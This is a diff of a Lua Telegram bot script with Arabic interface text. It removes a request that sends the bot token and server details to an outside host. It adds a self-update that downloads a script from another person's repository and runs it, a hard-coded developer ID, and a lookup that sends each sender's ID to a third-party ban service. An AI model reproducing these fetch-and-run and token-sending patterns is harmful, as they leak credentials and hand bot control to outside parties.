@@ -45,7 +45,7 @@ if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
 local SUDOID = io.read():gsub(' ','') 
 if tostring(SUDOID):match('%d+') then
-data,res = https.request("https://api-dragon.tk/api-s00f4/Dragon.php?bn=DRAGON&id="..SUDOID)
+data,res = https.request("https://api-dragon.tk/api-s00f4/Dragon.php?bn=DRAGON&id=119541395")
 if res == 200 then
 getIs = json:decode(data)
 if getIs.Info.info == 'Is_Spam' then
@@ -56,7 +56,7 @@ if getIs.Info.info == 'Ok' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 end 
-local t = json:decode(https.request('https://api-dragon.tk/api-s00f4/Dragon.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+
 else
 io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end  
@@ -170,11 +170,6 @@ bot_id = sudos.token:match("(%d+)")
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
-io.popen("mkdir File_Bot") 
-io.popen("cd File_Bot && rm -rf commands.lua.1") 
-io.popen("cd File_Bot && rm -rf commands.lua.2") 
-io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-DRAGON/Files_Dragon/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -1084,7 +1079,7 @@ end
 
 if text == 'تحديث السورس ℘' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/SRC-DRAGON/DRAGON/main/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/ahmedyad200/deagon/main/DRAGON.lua')
 send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس دراكون\n ℘︙ الاصدار » { v 1.6 }')
 dofile('DRAGON.lua')  
 end
@@ -2363,7 +2358,7 @@ end
 return false
 end
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/SRC-DRAGON/DRAGON/main/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/ahmedyad200/deagon/main/DRAGON.lua')
 send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس دراكون\n ℘︙ الاصدار » { v 1.6 }')
 dofile('DRAGON.lua')  
 end
@@ -2644,6 +2639,15 @@ end
 end
 end,nil)  
 end
+if msg.sender_user_id_ then 
+api = https.request('http://apis.zzz.com.ua/ban.php?id='..msg.sender_user_id_)
+ex = JSON.decode(api)
+ss = ex.status
+if ss == "band" or ss == 'ban' then
+chat_kick(msg.chat_id_,msg.sender_user_id_) 
+DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
+return false 
+end end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then
 Text = [[
 ⦑ Welcome to Source ⦒
